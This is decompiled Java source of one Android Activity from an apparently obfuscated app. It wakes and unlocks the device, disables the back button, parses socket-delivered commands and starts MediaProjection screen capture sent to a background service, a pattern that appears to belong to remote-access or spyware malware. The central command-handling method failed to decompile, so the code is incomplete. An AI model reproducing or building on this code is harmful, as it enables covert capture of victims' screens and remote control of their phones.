/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.content.Intent
 *  android.media.projection.MediaProjectionConfig
 *  android.media.projection.MediaProjectionManager
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Handler
 *  android.os.Looper
 *  android.os.PowerManager
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionConfig;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import java.util.regex.Pattern;
import linker.resourcer.encoder.aaskrfyvhoypymnzlskbzwpyr;
import linker.resourcer.encoder.jcavdzvncdstlcwvoszkepac;
import linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva;

public class dfcfkxjhxpghnfgax
extends Activity {
    private static int Quality = 0;
    private static final int REQUEST_CODE = 100;
    private static String Sockid;
    private String[] Commands = null;

    static {
        Quality = 70;
        Sockid = "null";
    }

    private void StopCatpure() {
        this.startService(jcavdzvncdstlcwvoszkepac.getStopIntent(this.getApplicationContext()));
    }

    static /* synthetic */ String[] access$000(dfcfkxjhxpghnfgax dfcfkxjhxpghnfgax2) {
        return dfcfkxjhxpghnfgax2.Commands;
    }

    static /* synthetic */ int access$100() {
        return Quality;
    }

    static /* synthetic */ int access$102(int n) {
        Quality = n;
        return n;
    }

    static /* synthetic */ String access$200() {
        return Sockid;
    }

    static /* synthetic */ String access$202(String string2) {
        Sockid = string2;
        return string2;
    }

    static /* synthetic */ void access$300(dfcfkxjhxpghnfgax dfcfkxjhxpghnfgax2) {
        dfcfkxjhxpghnfgax2.startCatpure();
    }

    static /* synthetic */ void access$400(dfcfkxjhxpghnfgax dfcfkxjhxpghnfgax2) {
        dfcfkxjhxpghnfgax2.StopCatpure();
    }

    private void startCatpure() {
        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager)this.getApplicationContext().getSystemService("media_projection");
        if (Build.VERSION.SDK_INT >= 34) {
            this.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(MediaProjectionConfig.createConfigForDefaultDisplay()), 100);
        } else {
            this.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), 100);
        }
    }

    protected void onActivityResult(int n, int n2, Intent intent) {
        super.onActivityResult(n, n2, intent);
        if (n == 100 && n2 == -1) {
            jhvbzpdwpbqgticwdxuva.Auto_Click = false;
            aaskrfyvhoypymnzlskbzwpyr.Stored_intentdata = intent;
            aaskrfyvhoypymnzlskbzwpyr.Stored_resultCode = n2;
            if (Build.VERSION.SDK_INT >= 26) {
                this.startForegroundService(jcavdzvncdstlcwvoszkepac.getStartIntent(this.getApplicationContext(), n2, intent, Quality, Sockid));
            } else {
                this.startService(jcavdzvncdstlcwvoszkepac.getStartIntent(this.getApplicationContext(), n2, intent, Quality, Sockid));
            }
            this.finish();
        }
    }

    public void onBackPressed() {
    }

    protected void onCreate(Bundle bundle) {
        block7: {
            super.onCreate(bundle);
            if (Build.VERSION.SDK_INT >= 27) {
                this.setShowWhenLocked(true);
                this.setTurnScreenOn(true);
            }
            this.getWindow().addFlags(0x280000);
            this.getWindow().addFlags(1024);
            bundle = (PowerManager)this.getSystemService("power");
            if (bundle == null) break block7;
            try {
                bundle.newWakeLock(805306394, "App:IncomingCall").acquire(3000L);
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }
        bundle = this.getIntent();
        try {
            this.Commands = bundle.getStringExtra("COM").trim().split(Pattern.quote(aaskrfyvhoypymnzlskbzwpyr.SPLIT_SKT));
        }
        catch (Exception exception) {
            this.Commands = null;
        }
        if (this.Commands == null) {
            this.finish();
            return;
        }
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable(this){
            final dfcfkxjhxpghnfgax this$0;
            {
                this.this$0 = dfcfkxjhxpghnfgax2;
            }

            /*
             * Exception decompiling
             */
            @Override
            public void run() {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [1[TRYBLOCK]], but top level block is 4[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }
        }, 1100L);
    }
}

